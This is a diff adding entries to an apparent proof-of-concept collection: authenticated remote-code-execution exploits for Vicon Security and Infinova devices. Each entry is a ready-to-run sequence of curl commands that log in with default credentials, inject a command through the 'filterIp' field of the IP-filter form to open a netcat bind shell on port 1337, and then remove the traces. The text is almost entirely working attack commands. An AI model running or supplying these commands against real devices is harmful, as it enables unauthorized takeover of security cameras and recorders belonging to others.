@@ -1,6 +1,32 @@
 # PoC
 misc PoC
 
+Vicon Security RCE (authenticated)
+---
+2017-12-03
+# Enable 'IP Filter'
+curl --user ADMIN:1234 -v -X POST http://<IP>:<PORT>/form/formChangeFirewallState -d "state=2"
+# Add to 'IP Filter' and execute
+curl --user ADMIN:1234 -v -X POST http://<IP>:<PORT>/form/AddIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
+# Disable 'IP Filter'
+curl --user ADMIN:1234 -v -X POST http://<IP>:<PORT>/form/formChangeFirewallState -d "state=0"
+# Remove from 'IP Filter'
+curl --user ADMIN:1234 -v -X POST http://<IP>:<PORT>/form/DeleteIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
+
+Infinova RCE (authenticated)
+---
+2017-12-03
+# Enable 'IP Filter'
+curl --user admin:admin -v -X POST http://<IP>:<PORT>/form/formChangeFirewallState -d "state=2"
+# Add to 'IP Filter' and execute
+curl --user admin:admin -v -X POST http://<IP>:<PORT>/form/AddIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
+# Disable 'IP Filter'
+curl --user admin:admin -v -X POST http://<IP>:<PORT>/form/formChangeFirewallState -d "state=0"
+# Remove from 'IP Filter'
+curl --user admin:admin -v -X POST http://<IP>:<PORT>/form/DeleteIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
+
+Note: Quite sure there is additional OEM's that share same.
+
 Axis Communications
 ---
 2017-12-01
